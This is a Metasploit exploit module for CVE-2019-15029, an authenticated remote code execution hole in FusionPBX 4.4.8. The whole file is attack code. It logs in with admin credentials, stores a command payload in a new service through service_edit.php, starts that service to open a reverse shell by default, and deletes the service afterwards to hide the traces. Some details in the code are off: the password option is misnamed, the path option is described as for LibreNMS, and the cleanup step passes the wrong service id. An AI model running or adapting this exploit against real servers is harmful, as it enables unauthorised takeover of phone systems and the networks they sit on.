class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient


  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'FusionPBX v4.4.8 authenticated Remote Code Execution',
      'Privileged'     => true,
      'Description'    => %q{
        FusionPBX 4.4.8 allows an attacker to execute arbitrary systemcommands by submitting a malicious command to the service_edit.php file (which will insert the malicious command into the database).
To trigger the command, one needs to call the services.php file via a GET request with the service id followed by the parameter a=start to execute the stored command.

      },
      'References'     =>
  [
    [ 'CVE', '2019-15029' ],
    [ 'URL', 'https://gist.github.com/mhaskar/7a6a804cd68c7fec4f9d1f5c3507900f' ]
  ],
      'Author'         => [ 'askar (@mohammadaskar2)' ],
      'License'        => MSF_LICENSE,
      'Arch'           => ARCH_CMD,
      'Targets'        =>
        [
          [ 'Linux',
            {
              'Platform' => 'unix',
            },
            'DefaultOptions' =>
            {
              'SSL'     => true,
              'Payload' =>  'cmd/unix/reverse',
            },

          ]
        ],
      'DisclosureDate' => '2019-08-13',
      'DefaultTarget'  => 0
    ))

    register_options(
    [
      OptString.new('TARGETURI', [ true, 'Base LibreNMS path', '/' ]),
      OptString.new('USERNAME', [ true, 'Admin username for FusionPBX', '' ]),
      OptString.new('PASSWORD', [ true, 'Admin password for FusionPBX', '' ]),
      OptBool.new('SSL', [ false, 'Negotiate SSL/TLS for outgoing connections', true])
    ])

  end




  def exploit
    uri = target_uri.path
    service_name = Rex::Text.rand_text_alpha(6...10)
    first_request = send_request_cgi({
      'method'     => 'POST',
      'uri'        => normalize_uri(uri, '/core/user_settings/user_dashboard.php'),
      'vars_post'  => {
        'username' => datastore['USERNAME'],
        'password' => datastore['Password']
      },
    })

    cookies = first_request.get_cookies
    if first_request && first_request.code == 200
      print_good("Logged In successfully to FusionPBX")
      vprint_status("Checking if services is available")

      services_request = send_request_cgi({
        'method' => 'GET',
        'uri'    => normalize_uri(uri, '/app/services/services.php'),
        'cookie' => cookies
      })

    if services_request && services_request.code == 200
        vprint_good("Services page available")
        vprint_status("Injecting payload ..")
        second_request = send_request_cgi({
          'method'   => 'POST',
          'cookie'   => cookies,
          'uri'      => normalize_uri(uri, '/app/services/service_edit.php'),
          'vars_post' => {
            # the service name you want to create
            "service_name" => service_name,
            "service_type"        => "pid",
            "service_data"        => "1",
            "service_cmd_start"   => payload.encoded,
            "service_cmd_stop"    => "Stop",
            "service_description" => "Desc",
            "submit"              => "Save"
          },
        })
        if second_request && second_request.code == 302
          print_good("Service added, retrieving service id ..")

          services_page_request = send_request_cgi({
            'method' => 'GET',
            'uri'    => normalize_uri(uri, '/app/services/services.php'),
            'cookie' => cookies
          })

          sid = services_page_request.get_html_document.search('//td//a[contains(text(), "%s")]' % [service_name]).to_s
          full_sid = sid.split('"')[1].split("=")[1]
          vprint_status("full sid of the service is #{full_sid} with name #{service_name}")
          vprint_status("triggering the shell .. ")
          services_page_request = send_request_cgi({
            'method' => 'GET',
            'uri'    => normalize_uri(uri, "/app/services/services.php?id=#{full_sid}&a=start"),
            'cookie' => cookies
          })

          delete_request = send_request_cgi({
            'method' => 'GET',
            'uri'    => normalize_uri(target_uri.path, "/app/services/service_delete.php?id=#{sid}"),
            'cookie' => cookies
          })

          if delete_request && delete_request.code == 302
            print_good("cleaning up , service has been deleted")
          end

        else
          print_error("Error while adding the service")
        end
    end

    else
      print_error("Wrong Creds")
    end
  end
end
